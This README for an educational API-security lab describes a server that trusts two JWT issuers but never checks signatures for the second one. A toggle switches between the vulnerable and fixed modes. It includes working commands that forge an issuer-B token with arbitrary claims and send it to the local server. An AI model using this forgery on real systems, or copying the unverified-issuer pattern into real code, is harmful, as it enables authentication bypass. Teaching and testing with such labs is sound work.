# JWT Issuer Confusion

This challenge demonstrates a JWT implementation trusting two issuers, where only one of them is properly signature-verified. Tokens claiming to come from `https://issuer-a.example.com` are verified against issuer A's RSA public key, but tokens claiming `https://issuer-b.example.com` are parsed unverified and treated as valid regardless of their signature.

## How to run it

```bash
go run main.go serve
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: tokens claiming issuer B are accepted without any signature check
go run main.go serve --vulnerable=true

# fixed: both issuers are properly signature-verified against their own key
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
# Get a sample legit token for issuer-b
TOKEN=$(go run main.go jwt-issuer-b)

# Forge a token with arbitrary claims and issuer "https://issuer-b.example.com",
# signed with any key (or none) - signature is never checked for this issuer
FORGED=$(python3 -c "
import jwt
print(jwt.encode({'iss': 'https://issuer-b.example.com', 'sub': 'attacker'}, 'anything', algorithm='HS256'))
")

curl -i http://localhost:8080/ -H "Authorization: Bearer $FORGED"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
